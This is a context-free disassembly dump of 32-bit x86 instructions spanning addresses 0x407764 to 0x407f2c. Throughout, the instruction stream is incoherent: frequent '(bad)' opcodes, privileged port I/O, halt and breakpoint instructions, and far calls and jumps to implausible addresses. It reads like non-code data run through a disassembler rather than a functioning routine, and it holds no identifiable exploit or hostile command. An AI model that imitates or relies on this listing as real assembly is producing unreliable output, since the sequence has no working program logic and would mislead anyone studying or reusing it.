  407764:	imul   esp,DWORD PTR [ebp+0x35],0xdce5fcc9
  40776b:	adc    BYTE PTR [eax+edx*1],ah
  40776e:	repz in eax,0x5a
  407771:	stos   DWORD PTR es:[edi],eax
  407772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407773:	mov    al,0x80
  407775:	mov    ch,BYTE PTR [edi-0x4f5d0ff]
  40777b:	hlt    
  40777c:	loop   0x4077c7
  40777e:	inc    edx
  40777f:	dec    esi
  407780:	inc    ecx
  407781:	imul   ecx,ecx,0xffffffd4
  407784:	out    0xab,eax
  407786:	xor    BYTE PTR [ebx-0x181502f3],ch
  40778c:	mov    dh,BYTE PTR [edi]
  40778e:	inc    edi
  40778f:	xchg   esp,eax
  407790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407791:	repnz int 0x4
  407794:	gs jns 0x407730
  407797:	pop    esi
  407798:	mov    DWORD PTR [eax],esi
  40779a:	arpl   WORD PTR [ebp+0x49],di
  40779d:	add    DWORD PTR [esi-0x486de1a2],esp
  4077a3:	out    dx,eax
  4077a4:	fcom   DWORD PTR [edi]
  4077a6:	test   dl,al
  4077a8:	int    0x1f
  4077aa:	dec    ebp
  4077ab:	aas    
  4077ac:	hlt    
  4077ad:	js     0x4077eb
  4077af:	lock dec ebx
  4077b1:	xchg   edi,eax
  4077b2:	into   
  4077b3:	fwait
  4077b4:	call   0x4f3c:0x408a113d
  4077bb:	jmp    0xd311558e
  4077c0:	mov    ecx,0xdbf03a77
  4077c5:	stc    
  4077c6:	sahf   
  4077c7:	aaa    
  4077c8:	dec    edx
  4077c9:	dec    ebx
  4077ca:	ja     0x4077fa
  4077cc:	push   edi
  4077cd:	test   BYTE PTR [edx],ch
  4077cf:	sbb    BYTE PTR [eax+0x44],bl
  4077d2:	repz xor dl,BYTE PTR [esi+0xf542b7b]
  4077d9:	jno    0x407765
  4077db:	lahf   
  4077dc:	(bad)  
  4077dd:	cmp    ebp,edx
  4077df:	imul   ecx,DWORD PTR [esi-0x38abe314],0xffffffa9
  4077e6:	xor    ecx,eax
  4077e8:	fsub   DWORD PTR [ecx]
  4077ea:	ret    
  4077eb:	and    BYTE PTR [esi-0x7],dh
  4077ee:	push   edx
  4077ef:	setb   al
  4077f2:	and    eax,0xcac8914a
  4077f7:	in     eax,0x7e
  4077f9:	cwde   
  4077fa:	inc    esp
  4077fb:	imul   ecx,DWORD PTR [edi],0xf659cf29
  407801:	sbb    eax,DWORD PTR [edi+0x38]
  407804:	add    cl,bl
  407806:	sti    
  407807:	pop    es
  407808:	cs pusha 
  40780a:	cmc    
  40780b:	add    eax,0x6221922a
  407810:	mov    dh,0xcf
  407812:	and    ebx,DWORD PTR [ebp+0x10613a37]
  407818:	repnz mov ebp,0xd8412bc0
  40781e:	adc    cl,BYTE PTR [edx-0x3fe2b3a5]
  407824:	mov    al,BYTE PTR [ecx]
  407826:	push   esi
  407827:	sbb    BYTE PTR [ebp+edi*1-0x75],cl
  40782b:	sahf   
  40782c:	adc    al,0x92
  40782e:	push   ebx
  40782f:	loopne 0x407807
  407831:	mov    ebx,0xad10a7a0
  407836:	push   esi
  407837:	shl    DWORD PTR [ebp+edx*1+0x64],cl
  40783b:	ucomiss xmm5,xmm4
  40783e:	clc    
  40783f:	inc    ebp
  407840:	add    DWORD PTR [ebp+edx*4-0x6cf7f15],ebx
  407847:	arpl   bp,ax
  407849:	lods   al,BYTE PTR ds:[esi]
  40784a:	push   esi
  40784b:	pop    ecx
  40784c:	add    bh,al
  40784e:	data16 stc 
  407850:	ins    BYTE PTR es:[edi],dx
  407851:	and    al,al
  407853:	or     eax,0x1c6da7
  407858:	mov    dl,0x8a
  40785a:	jo     0x407865
  40785c:	sbb    eax,0xa89b27ec
  407861:	jecxz  0x407870
  407863:	scas   eax,DWORD PTR es:[edi]
  407864:	lods   al,BYTE PTR ds:[esi]
  407865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407866:	add    cl,dh
  407868:	aas    
  407869:	mov    cl,0xfc
  40786b:	add    DWORD PTR [ebp+0x7f172c7c],ebx
  407871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407872:	or     al,0x46
  407874:	leave  
  407875:	fnstsw WORD PTR [esi+0x7a]
  407878:	std    
  407879:	into   
  40787a:	mov    ebp,0xb582b36
  40787f:	stos   DWORD PTR es:[edi],eax
  407880:	mov    ebx,0x926f5dc8
  407885:	out    dx,al
  407886:	out    dx,al
  407887:	mov    DWORD PTR ds:0x6860ba33,edx
  40788d:	xchg   ebx,eax
  40788e:	shr    DWORD PTR [ebp-0x19],0x54
  407892:	out    0xa6,eax
  407894:	dec    ecx
  407895:	sar    DWORD PTR [edi-0x4ed2ba9a],0x7d
  40789c:	add    ch,BYTE PTR [ecx-0x15]
  40789f:	mov    eax,0xf8c0f199
  4078a4:	repnz icebp 
  4078a6:	inc    esp
  4078a7:	add    DWORD PTR [esi+0x40],ebp
  4078aa:	lods   al,BYTE PTR ds:[esi]
  4078ab:	into   
  4078ac:	adc    esp,DWORD PTR [esi+0x7010b0d2]
  4078b2:	jmp    0x4078a0
  4078b4:	repnz push esp
  4078b6:	sub    dh,BYTE PTR [eax-0x27]
  4078b9:	xchg   DWORD PTR [edi+0x893d90d],ebx
  4078bf:	dec    ecx
  4078c0:	push   ebx
  4078c1:	popa   
  4078c2:	push   edi
  4078c3:	ja     0x40788d
  4078c5:	mov    bl,0x61
  4078c7:	fdivp  st(7),st
  4078c9:	stos   DWORD PTR es:[edi],eax
  4078ca:	cld    
  4078cb:	xchg   esp,eax
  4078cc:	sub    ebx,DWORD PTR [esp+edi*4-0x31]
  4078d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d1:	mov    ecx,DWORD PTR [esi-0x3b28d8d]
  4078d7:	sub    DWORD PTR [ebx],ecx
  4078d9:	sbb    eax,0x100a39bb
  4078de:	cmp    DWORD PTR [esi+0xa],ecx
  4078e1:	jmp    0x407863
  4078e3:	dec    ecx
  4078e4:	jle    0x40792b
  4078e6:	imul   ebx,DWORD PTR [edi+0xe],0x60a0046d
  4078ed:	test   edi,0xb569d412
  4078f3:	ret    0x3b20
  4078f6:	jmp    0x1c63e8eb
  4078fb:	add    BYTE PTR [edi-0x74470f95],bh
  407901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407902:	repz sub BYTE PTR [edx],0x1a
  407906:	lods   al,BYTE PTR ds:[esi]
  407907:	rcl    DWORD PTR [ecx],0xd8
  40790a:	sbb    ch,bl
  40790c:	mov    BYTE PTR ds:0xb972a878,al
  407912:	mov    ah,0xa3
  407914:	jb     0x407897
  407916:	lahf   
  407917:	mov    WORD PTR [eax+0xc],fs
  40791a:	loopne 0x407973
  40791c:	jbe    0x407921
  40791e:	sar    DWORD PTR [ebx-0x5e65873],cl
  407924:	(bad)  [esi+0x29bd7e07]
  40792a:	ins    DWORD PTR es:[edi],dx
  40792b:	and    ebp,edx
  40792d:	cwde   
  40792e:	push   ebp
  40792f:	pop    ds
  407930:	(bad)  
  407931:	sub    edx,DWORD PTR [edi+0x6f]
  407934:	mov    al,ds:0x164463e5
  407939:	mov    dl,0xf0
  40793b:	stc    
  40793c:	shl    DWORD PTR [ecx-0x64a29638],1
  407942:	jg     0x4078d4
  407944:	in     al,dx
  407945:	sbb    dl,dh
  407947:	dec    esi
  407948:	cwde   
  407949:	ja     0x407964
  40794b:	test   BYTE PTR [eax-0x3f],cl
  40794e:	xchg   ebp,eax
  40794f:	into   
  407950:	cmp    eax,0xc5c99cbe
  407955:	test   DWORD PTR [ebx-0x78],0xacf9a155
  40795c:	mov    edi,0x5c66112b
  407961:	inc    ebx
  407962:	jp     0x40791e
  407964:	shl    edx,cl
  407966:	fwait
  407967:	sub    ah,BYTE PTR [ebp-0x50]
  40796a:	leave  
  40796b:	test   eax,0xed65033f
  407970:	stos   DWORD PTR es:[edi],eax
  407971:	mov    cs,WORD PTR [edi]
  407973:	mov    esi,?
  407975:	ja     0x4079b7
  407977:	aad    0x11
  407979:	hlt    
  40797a:	add    BYTE PTR [eax+edx*8-0x23],0xd
  40797f:	sub    ebx,DWORD PTR [esi]
  407981:	aaa    
  407982:	test   BYTE PTR [ecx+0x20675bf],bh
  407988:	dec    ebp
  407989:	sub    ah,BYTE PTR [ebp+0x51adcdc7]
  40798f:	popf   
  407990:	fsub   QWORD PTR [esi-0x1b]
  407993:	fcomp  DWORD PTR [edi]
  407995:	adc    edx,DWORD PTR [ecx+0x77671aac]
  40799b:	cli    
  40799c:	nop
  40799d:	aad    0x75
  40799f:	mov    dl,0x9f
  4079a1:	daa    
  4079a2:	aad    0xc8
  4079a4:	sub    DWORD PTR [ecx+0x291f9dc1],esi
  4079aa:	pop    eax
  4079ab:	inc    ecx
  4079ac:	es add eax,0x4da8fb3a
  4079b2:	inc    edx
  4079b3:	mov    cl,0x7e
  4079b5:	mov    cl,0xbe
  4079b7:	rol    BYTE PTR fs:[ebx+0x38180051],0x72
  4079bf:	or     al,0xa0
  4079c1:	dec    edi
  4079c2:	mov    edx,0xadf1e2f9
  4079c7:	mov    esi,0xc66d7698
  4079cc:	pop    edx
  4079cd:	xor    ebp,DWORD PTR [ecx+eiz*8-0x500423b4]
  4079d4:	adc    dh,0x62
  4079d7:	push   edi
  4079d8:	adc    BYTE PTR [esi-0x7eb6ec2a],0xf4
  4079df:	push   0x2b11f7f1
  4079e4:	(bad)  
  4079e5:	inc    edx
  4079e6:	dec    eax
  4079e7:	mov    esi,es
  4079e9:	packuswb mm3,QWORD PTR [eax]
  4079ec:	(bad)  
  4079ee:	stos   DWORD PTR es:[edi],eax
  4079ef:	mov    esi,0x5a4631a7
  4079f4:	inc    ebx
  4079f5:	dec    eax
  4079f6:	ret    0x22f
  4079f9:	mov    bl,0x5b
  4079fb:	(bad)  
  4079fc:	pop    ebx
  4079fd:	sbb    al,0xd1
  4079ff:	ins    BYTE PTR es:[edi],dx
  407a00:	repnz and ecx,ebx
  407a03:	pop    eax
  407a04:	test   al,0x1b
  407a06:	out    dx,eax
  407a07:	lahf   
  407a08:	aam    0x3b
  407a0a:	call   0xeb5d:0x3cb9574a
  407a11:	xchg   esi,eax
  407a12:	jne    0x407a64
  407a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a15:	(bad)  
  407a16:	cmp    DWORD PTR [edx-0x428b3193],ebp
  407a1c:	repnz aad 0xad
  407a1f:	cli    
  407a20:	leave  
  407a21:	aam    0x38
  407a23:	int3   
  407a24:	dec    edi
  407a25:	push   esi
  407a26:	jmp    DWORD PTR [edi+0x17e9c12e]
  407a2c:	adc    edx,DWORD PTR [edx-0x216ae942]
  407a32:	inc    esi
  407a33:	pop    ebx
  407a34:	nop
  407a35:	shl    dh,1
  407a37:	cmp    DWORD PTR [edx+0x6fdb45dd],eax
  407a3d:	rol    BYTE PTR [ebp+ecx*8-0x686deafe],cl
  407a44:	lahf   
  407a45:	xor    eax,0x9e7be227
  407a4a:	cmp    esi,DWORD PTR [edx]
  407a4c:	sub    al,al
  407a4e:	or     al,0xbf
  407a50:	mov    ch,0x32
  407a52:	ficomp WORD PTR [ebx-0x62]
  407a55:	cmp    ebp,ecx
  407a57:	mov    eax,0xa45e53be
  407a5c:	jmp    0x24f9c715
  407a61:	mov    bl,0xa1
  407a63:	push   es
  407a64:	repz add al,0x97
  407a67:	mov    dh,0x86
  407a69:	js     0x407a9c
  407a6b:	cmc    
  407a6c:	and    eax,0x892d9b0d
  407a71:	or     eax,0x6a4d2c18
  407a76:	mov    ds:0xe9a44a8f,eax
  407a7b:	outs   dx,BYTE PTR ds:[esi]
  407a7c:	cld    
  407a7d:	leave  
  407a7e:	hlt    
  407a7f:	inc    edx
  407a80:	rol    cl,0x9c
  407a83:	aam    0xfb
  407a85:	sub    al,0xf8
  407a87:	retf   0x2fd
  407a8a:	pop    esi
  407a8b:	lods   eax,DWORD PTR ds:[esi]
  407a8c:	test   DWORD PTR [edi-0x65],edi
  407a8f:	adc    al,bl
  407a91:	sar    DWORD PTR [edi-0x5c2756f6],cl
  407a97:	(bad)  
  407a98:	adc    ah,ch
  407a9a:	sub    ch,BYTE PTR [edx+0x27]
  407a9d:	aad    0x80
  407a9f:	repnz add al,0x37
  407aa2:	sub    al,0x1e
  407aa4:	rcr    BYTE PTR [edx+0x30],0xb4
  407aa8:	mov    dh,BYTE PTR [bx+di]
  407aab:	popa   
  407aac:	bound  edi,QWORD PTR [edi-0x3a4b1d12]
  407ab2:	shr    DWORD PTR [ebp-0x49],0x1c
  407ab6:	gs jbe 0x407a3e
  407ab9:	sahf   
  407aba:	adc    al,0xf2
  407abc:	pop    edi
  407abd:	aas    
  407abe:	test   BYTE PTR [edi-0x1e5d12e8],dl
  407ac4:	je     0x407aaa
  407ac6:	fucom  st(3)
  407ac8:	pop    ebx
  407ac9:	test   ecx,esp
  407acb:	sbb    dl,ah
  407acd:	loop   0x407ab7
  407acf:	fsubr  st,st(2)
  407ad1:	mov    ds:0xae52b256,al
  407ad6:	fsub   DWORD PTR [ebx-0x47]
  407ad9:	or     dh,BYTE PTR [esi]
  407adb:	ins    DWORD PTR es:[edi],dx
  407adc:	in     eax,dx
  407add:	sar    DWORD PTR [edx+ebp*2-0x625dfc2f],1
  407ae4:	and    al,0x23
  407ae6:	sbb    DWORD PTR [ebx+0x4a3f9628],eax
  407aec:	mov    al,ds:0xb5e572c7
  407af1:	out    dx,eax
  407af2:	pop    ecx
  407af3:	popf   
  407af4:	imul   ebp,DWORD PTR [ecx-0x73990a23],0xb3f71333
  407afe:	push   cs
  407aff:	jp     0x407acb
  407b01:	mov    ch,0xcf
  407b03:	out    dx,eax
  407b04:	or     eax,0x5c0b55b0
  407b09:	xor    ebp,ecx
  407b0b:	mov    dl,0x7c
  407b0d:	jno    0x407a90
  407b0f:	cld    
  407b10:	fs repnz mov ah,0xd3
  407b14:	adc    BYTE PTR [ecx+0x29b1a4d0],ch
  407b1a:	mov    cl,ch
  407b1c:	xchg   esi,eax
  407b1d:	or     eax,0x6e464402
  407b22:	push   ecx
  407b23:	test   esi,esi
  407b25:	aaa    
  407b26:	test   al,0x4c
  407b28:	fs push 0x49
  407b2b:	or     ch,BYTE PTR [eax]
  407b2d:	inc    ecx
  407b2e:	ror    BYTE PTR [ecx],1
  407b30:	mov    DWORD PTR [ecx+eax*8-0x7c],0x6190954c
  407b38:	push   0xffffffd6
  407b3a:	add    eax,0x8757b48e
  407b3f:	daa    
  407b40:	sti    
  407b41:	dec    ebp
  407b42:	xchg   BYTE PTR [edi],bl
  407b44:	push   ebx
  407b45:	xchg   ecx,eax
  407b46:	iret   
  407b47:	mov    ch,0x41
  407b49:	scas   eax,DWORD PTR es:[edi]
  407b4a:	arpl   WORD PTR [eax-0x20],cx
  407b4d:	in     al,dx
  407b4e:	jbe    0x407b7c
  407b50:	or     BYTE PTR [ecx+0x66],al
  407b53:	cmp    al,0x8
  407b55:	retf   
  407b56:	neg    edi
  407b58:	xor    cl,bl
  407b5a:	xor    cl,cl
  407b5c:	repnz scas eax,DWORD PTR es:[edi]
  407b5e:	mov    bh,0xf1
  407b60:	xchg   esi,eax
  407b61:	pop    esp
  407b62:	adc    ebp,DWORD PTR [ecx-0x2ae41ccc]
  407b68:	adc    bl,ah
  407b6a:	pop    ecx
  407b6b:	mov    ah,0xf3
  407b6d:	add    ebx,ebx
  407b6f:	lock sub al,0x53
  407b72:	lea    ebp,ds:0xf73df9d5
  407b78:	in     al,dx
  407b79:	sbb    cx,WORD PTR [ecx]
  407b7c:	mov    al,ds:0xe2dd2c79
  407b81:	dec    edx
  407b82:	in     eax,0xb0
  407b84:	adc    BYTE PTR [eax-0x34e8f23f],ah
  407b8a:	add    BYTE PTR [ecx+eax*8],0x4e
  407b8e:	sbb    bh,BYTE PTR [ecx+eax*1]
  407b91:	mov    ds:0xe601a08c,eax
  407b96:	jp     0x407b85
  407b98:	jb     0x407c0e
  407b9a:	xor    DWORD PTR [edi-0x68],ecx
  407b9d:	mov    ebp,0xa00a975
  407ba2:	sbb    DWORD PTR [ecx-0x7d5242aa],edi
  407ba8:	mov    ds:0xf2872e64,al
  407bad:	add    ah,BYTE PTR [edi-0x42]
  407bb0:	xchg   edi,eax
  407bb1:	inc    eax
  407bb2:	out    0x12,al
  407bb4:	icebp  
  407bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb6:	gs jbe 0x407bb2
  407bb9:	loop   0x407b71
  407bbb:	add    edx,esp
  407bbd:	sbb    eax,0xbb63b6f0
  407bc2:	push   eax
  407bc3:	repnz dec ebx
  407bc5:	lea    edx,[ebx]
  407bc7:	pop    esp
  407bc8:	pusha  
  407bc9:	ret    0xf211
  407bcc:	or     DWORD PTR [edi+0x3fac4898],0xd5ce4980
  407bd6:	xchg   edx,eax
  407bd7:	jg     0x407bd9
  407bd9:	les    esi,FWORD PTR [eax+0x470a4044]
  407bdf:	(bad)  
  407be0:	ror    DWORD PTR [esi+eiz*8+0x79],1
  407be4:	lahf   
  407be5:	mov    ah,0x43
  407be7:	icebp  
  407be8:	daa    
  407be9:	push   esi
  407bea:	outs   dx,BYTE PTR ds:[esi]
  407beb:	xor    eax,0x7c85435
  407bf0:	test   al,0xb6
  407bf2:	loop   0x407c1e
  407bf4:	mov    DWORD PTR ds:0x2eaae094,0x4913a665
  407bfe:	js     0x407bcb
  407c00:	jne    0x407c06
  407c02:	mov    eax,ds:0xc1b822ab
  407c07:	icebp  
  407c08:	mov    eax,ds:0x744b502a
  407c0d:	repz jp 0x407c5a
  407c10:	or     ah,BYTE PTR [ecx-0x3bdcd3bb]
  407c16:	outs   dx,DWORD PTR ds:[esi]
  407c17:	(bad)  
  407c19:	sub    eax,0x2c694829
  407c1e:	mov    ebp,0x7421f1cc
  407c23:	cmc    
  407c24:	pushf  
  407c25:	pop    es
  407c26:	dec    edi
  407c27:	aaa    
  407c28:	dec    ebp
  407c29:	mov    esi,0x4f1ebe2e
  407c2e:	clc    
  407c2f:	pushf  
  407c30:	mov    edi,DWORD PTR [eax-0x66]
  407c33:	fnstenv [ebx-0x759df9ef]
  407c39:	ret    0x9031
  407c3c:	loope  0x407c85
  407c3e:	xchg   DWORD PTR [esi+eax*2],ebp
  407c41:	stos   DWORD PTR es:[edi],eax
  407c42:	or     al,BYTE PTR [ebx-0x58]
  407c45:	iret   
  407c46:	jbe    0x407bd6
  407c48:	and    BYTE PTR [esi+0x53fe3028],bl
  407c4e:	leave  
  407c4f:	std    
  407c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c51:	sub    al,BYTE PTR cs:[esi-0x6ccbd699]
  407c58:	mov    esi,0xa3614b57
  407c5d:	in     al,0x26
  407c5f:	add    ebx,ebx
  407c61:	lea    esp,[edx+0x4779cc4]
  407c67:	(bad)  
  407c68:	and    al,0xa0
  407c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c6b:	(bad)  
  407c6c:	in     eax,dx
  407c6d:	stos   BYTE PTR es:[edi],al
  407c6e:	dec    BYTE PTR [edi-0x39]
  407c71:	imul   ecx,ebx,0x60
  407c74:	fst    st(3)
  407c76:	mov    edx,0x4c5c873a
  407c7b:	inc    ebx
  407c7c:	jecxz  0x407c80
  407c7e:	or     BYTE PTR ds:0xd2a6b1f7,bl
  407c84:	repnz leave 
  407c86:	cmp    DWORD PTR [ebp-0x68636f5b],eax
  407c8c:	scas   al,BYTE PTR es:[edi]
  407c8d:	stos   DWORD PTR es:[edi],eax
  407c8e:	(bad)  
  407c8f:	jge    0x407c35
  407c91:	int3   
  407c92:	inc    edx
  407c93:	stos   DWORD PTR es:[edi],eax
  407c94:	xchg   ecx,eax
  407c95:	fcmovbe st,st(4)
  407c97:	mov    dl,0x78
  407c99:	pop    ds
  407c9a:	mov    edx,0x5f2378e
  407c9f:	sbb    DWORD PTR [edx+0x3e5edfff],ebx
  407ca5:	push   edi
  407ca6:	xor    DWORD PTR [ebp+0x26],edx
  407ca9:	cmp    BYTE PTR [eax+0x7e],cl
  407cac:	fsubr  st,st(4)
  407cae:	stc    
  407caf:	mov    bh,BYTE PTR [edi+0x2abd7a08]
  407cb5:	jo     0x407c63
  407cb7:	sub    eax,0x82512314
  407cbc:	mov    ebp,0xac5ebe3f
  407cc1:	add    al,0x9
  407cc3:	jmp    0xb0f84dd3
  407cc8:	pop    edx
  407cc9:	sbb    edi,DWORD PTR [ecx-0x62985a97]
  407ccf:	lods   eax,DWORD PTR ds:[esi]
  407cd0:	pop    edi
  407cd1:	or     eax,0x54fad45d
  407cd6:	inc    ebp
  407cd7:	mov    ecx,0xb812789
  407cdc:	and    ecx,ebp
  407cde:	loopne 0x407d0a
  407ce0:	or     eax,0xf9341e6d
  407ce5:	push   eax
  407ce6:	nop
  407ce7:	ss jae 0x407d4e
  407cea:	into   
  407ceb:	mov    al,BYTE PTR [ecx+0x44]
  407cee:	inc    esi
  407cef:	repnz lds ecx,FWORD PTR [esi]
  407cf2:	fs pop ebx
  407cf4:	iret   
  407cf5:	fst    DWORD PTR es:[esi+0x4d]
  407cf9:	aad    0xb3
  407cfb:	sbb    ch,ah
  407cfd:	(bad)  
  407cfe:	loopne 0x407cb6
  407d00:	cmp    al,0x22
  407d02:	je     0x407d20
  407d04:	rcr    BYTE PTR [esi+0x34],0x68
  407d08:	out    dx,al
  407d09:	lds    ecx,FWORD PTR [ebx+0x4d]
  407d0c:	out    0xfc,al
  407d0e:	mov    dh,0xe0
  407d10:	scas   al,BYTE PTR es:[edi]
  407d11:	into   
  407d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d13:	sub    ebx,ebx
  407d15:	xor    al,0x4f
  407d17:	arpl   WORD PTR [ecx-0x5],cx
  407d1a:	ins    BYTE PTR es:[edi],dx
  407d1b:	adc    BYTE PTR [ecx+0x11],bl
  407d1e:	dec    edx
  407d1f:	mov    al,ds:0xdd16529c
  407d24:	cmp    dl,BYTE PTR ds:0xa02b60a5
  407d2a:	jo     0x407d07
  407d2c:	in     eax,dx
  407d2d:	cwde   
  407d2e:	jl     0x407da3
  407d30:	loope  0x407cbe
  407d32:	nop
  407d33:	dec    esp
  407d34:	pusha  
  407d35:	push   eax
  407d36:	jecxz  0x407d1d
  407d38:	rcl    cl,cl
  407d3a:	out    dx,eax
  407d3b:	pusha  
  407d3c:	ds es pushf 
  407d3f:	call   0xa69d:0x8d102350
  407d46:	nop
  407d47:	mov    esi,DWORD PTR [eax-0x7153e289]
  407d4d:	adc    eax,0x250adf53
  407d52:	out    0xf1,al
  407d54:	sbb    BYTE PTR [esp+ecx*4+0x6eb2d0f7],0xb2
  407d5c:	jo     0x407d4d
  407d5e:	adc    DWORD PTR ds:0x67aec07e,ebx
  407d64:	lea    edx,[eax]
  407d66:	shr    BYTE PTR [esi],1
  407d68:	fs mov ecx,0x8789a203
  407d6e:	pop    edx
  407d6f:	pop    eax
  407d70:	xchg   esp,esp
  407d72:	dec    edx
  407d73:	push   ebp
  407d74:	pop    esp
  407d75:	sub    eax,0x5d71b9fd
  407d7a:	(bad)
  407d7d:	test   DWORD PTR ds:0x3011dd89,ebp
  407d83:	mul    BYTE PTR [ecx-0x2bc10f1]
  407d89:	nop
  407d8a:	loope  0x407dc2
  407d8c:	rol    BYTE PTR [esi+0x14a72cc8],0xc9
  407d93:	loop   0x407d39
  407d95:	or     eax,0xdefc2e86
  407d9a:	cld    
  407d9b:	xor    DWORD PTR [eax],0xffffffab
  407d9e:	xchg   ebx,eax
  407d9f:	dec    ebp
  407da0:	data16 jl 0x407d45
  407da3:	out    0x3e,eax
  407da5:	scas   al,BYTE PTR es:[edi]
  407da6:	out    0x29,eax
  407da8:	rcl    DWORD PTR [edi+0x15fa7b18],0xd0
  407daf:	lds    ecx,FWORD PTR [ecx+ebx*2-0x35]
  407db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db4:	jo     0x407d52
  407db6:	imul   DWORD PTR [esi-0x70]
  407db9:	jns    0x407e29
  407dbb:	xor    eax,DWORD PTR [esp+ecx*2-0x37]
  407dbf:	leave  
  407dc0:	out    0xd4,eax
  407dc2:	test   ecx,ecx
  407dc4:	lods   eax,DWORD PTR ds:[esi]
  407dc5:	jecxz  0x407dee
  407dc7:	add    dl,BYTE PTR [edi+ecx*4-0x46]
  407dcb:	cmp    BYTE PTR ds:0x46f78bfb,0x7
  407dd2:	sub    DWORD PTR [ecx+0x7e],edi
  407dd5:	pusha  
  407dd6:	jl     0x407dad
  407dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd9:	dec    ecx
  407dda:	mov    ah,0x6e
  407ddc:	or     esi,ecx
  407dde:	jp     0x407d93
  407de0:	jmp    0x5ae8c12b
  407de5:	dec    ebp
  407de6:	ret    
  407de7:	ficom  DWORD PTR [esi+0x62ad533d]
  407ded:	and    eax,0x1175c286
  407df2:	fst    QWORD PTR [esi-0x7f9d9cef]
  407df8:	ret    
  407df9:	cmp    ebp,ebx
  407dfb:	inc    esi
  407dfc:	fnstenv [ebp-0x3d1e7f1a]
  407e02:	dec    ebp
  407e03:	into   
  407e04:	daa    
  407e05:	dec    esi
  407e06:	xor    bl,cl
  407e08:	(bad)  
  407e09:	xor    eax,0x8e3adcfb
  407e0e:	fnstsw WORD PTR [ecx+0x3d]
  407e11:	push   esp
  407e12:	(bad)  
  407e13:	(bad)  
  407e14:	int    0x37
  407e16:	cdq    
  407e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e18:	cwde   
  407e19:	sub    al,0x5c
  407e1b:	pushf  
  407e1c:	imul   esp,DWORD PTR [ebp-0x29ee6359],0xa793e0d3
  407e26:	cld    
  407e27:	fsubr  DWORD PTR [eax-0x15]
  407e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e2b:	add    dl,bh
  407e2d:	cs mov edx,0x5459ba8e
  407e33:	jle    0x407e6b
  407e35:	jg     0x407df9
  407e37:	pop    ebx
  407e38:	xchg   esp,eax
  407e39:	out    dx,eax
  407e3a:	inc    eax
  407e3b:	je     0x407e86
  407e3d:	mov    esi,0x99924309
  407e42:	sbb    al,0x47
  407e44:	out    dx,al
  407e45:	add    BYTE PTR [esi+0x2ca932ac],dl
  407e4b:	add    DWORD PTR [ecx+0x3332d260],ecx
  407e51:	dec    eax
  407e52:	sbb    al,0x67
  407e54:	or     DWORD PTR [edx+edx*8],ebp
  407e57:	mov    al,0x58
  407e59:	mov    edx,0x8351cda7
  407e5e:	test   DWORD PTR [ebx+0x68],eax
  407e61:	js     0x407e8a
  407e63:	cmp    BYTE PTR [esi+edi*8-0x4a],al
  407e67:	push   ebp
  407e68:	inc    eax
  407e69:	or     bh,BYTE PTR [esi]
  407e6b:	call   0xa3a1:0x20f6c3a6
  407e72:	jp     0x407e73
  407e74:	js     0x407e27
  407e76:	test   al,0x71
  407e78:	outs   dx,DWORD PTR ds:[esi]
  407e79:	out    dx,eax
  407e7a:	std    
  407e7b:	mov    eax,0xcc9132da
  407e80:	mov    ecx,0xe92c7c2e
  407e85:	test   DWORD PTR [ecx-0x1d],ecx
  407e88:	or     al,0x42
  407e8a:	pop    edi
  407e8b:	xchg   edx,eax
  407e8c:	(bad)  
  407e8d:	fs aaa 
  407e8f:	or     ecx,DWORD PTR [edx]
  407e91:	call   0xf18e:0x4518361
  407e98:	call   0x6644:0x463346cd
  407e9f:	jne    0x407e8e
  407ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea2:	push   ecx
  407ea3:	add    al,0x6d
  407ea5:	mov    cl,0x61
  407ea7:	pushf  
  407ea8:	cld    
  407ea9:	or     al,0x77
  407eab:	out    0xbb,al
  407ead:	(bad)  
  407eae:	test   al,0x19
  407eb0:	popf   
  407eb1:	lock rcl BYTE PTR [ecx-0x1846215a],0xe1
  407eb9:	cli    
  407eba:	add    ecx,DWORD PTR [eax+0x7d]
  407ebd:	pop    ebx
  407ebe:	repz sub al,0x82
  407ec1:	mov    bl,BYTE PTR [ecx]
  407ec3:	xchg   ebp,eax
  407ec4:	fnstcw WORD PTR [edi]
  407ec6:	sub    eax,0xfa0f3c21
  407ecb:	xor    ch,BYTE PTR [ebx-0xb]
  407ece:	jmp    0x61bbedda
  407ed3:	data16 mov ds:0x977376b9,al
  407ed9:	addr16 push esi
  407edb:	loope  0x407f06
  407edd:	adc    al,0x27
  407edf:	ins    BYTE PTR es:[edi],dx
  407ee0:	loopne 0x407f00
  407ee2:	outs   dx,BYTE PTR fs:[esi]
  407ee4:	rcl    BYTE PTR [eax],cl
  407ee6:	shr    BYTE PTR fs:[ecx-0x573e23b6],cl
  407eed:	out    0x82,al
  407eef:	cmp    DWORD PTR cs:[ebx+ecx*4+0x4d3bde1b],eax
  407ef7:	clc    
  407ef8:	xchg   edi,eax
  407ef9:	jns    0x407ecc
  407efb:	dec    ebx
  407efc:	lea    cx,[esi+0x5d]
  407f00:	retf   
  407f01:	dec    ecx
  407f02:	add    al,0x80
  407f04:	jmp    0x7dbf:0x1416c51e
  407f0b:	mov    dl,BYTE PTR [eax+0x2344d91b]
  407f11:	push   esp
  407f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f13:	xor    al,0x32
  407f15:	pop    ebp
  407f16:	or     DWORD PTR ds:0xf68f5f6d,edx
  407f1c:	push   edi
  407f1d:	or     eax,0x528dff72
  407f22:	mov    bh,0xfd
  407f24:	fbstp  TBYTE PTR [ebp+0x6e]
  407f27:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407f29:	ds mov dl,0xca
  407f2c:	sbb    BYTE PTR [esi],0x25
